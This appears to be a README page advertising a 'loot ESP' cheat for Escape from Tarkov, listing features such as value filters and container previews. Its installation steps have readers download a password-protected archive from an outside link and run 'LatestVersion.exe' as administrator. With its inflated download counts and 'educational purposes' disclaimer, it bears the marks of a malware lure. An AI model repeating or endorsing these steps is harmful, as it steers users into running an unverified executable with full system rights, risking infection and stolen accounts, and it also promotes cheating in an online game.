# Tarkov Loot ESP 2026 — High Value Filter

![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.4m%2B-orange?style=flat-square)

> **EFT loot ESP — highlights only high-value items above your custom ruble threshold.**

---

## Features

- ✅ Custom value threshold filter
- ✅ Rare item highlighting
- ✅ Keycard and key ESP
- ✅ Weapon and mod value display
- ✅ Container content preview
- ✅ FIR item tracking

---

## Requirements

- Windows 10/11 (64-bit)
- Administrator rights

---

## Installation

1. Scroll down and click the **Download** button
2. Extract with WinRAR or 7-Zip — enter the password when prompted
3. The archive password is shown on the **download page**
4. Right-click `LatestVersion.exe` and select **Run as administrator**
5. Follow the on-screen instructions and click **Start**
6. Done — enjoy!

---

## FAQ

**Q: Threshold?**
A: Yes — set minimum ruble value to show items.

**Q: FIR?**
A: Yes — marks which items are Found in Raid status.

---

## Downloads

**Monthly downloads:** 1.4m+

[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/tarkovloothack)

---

*Use for educational and research purposes only.*
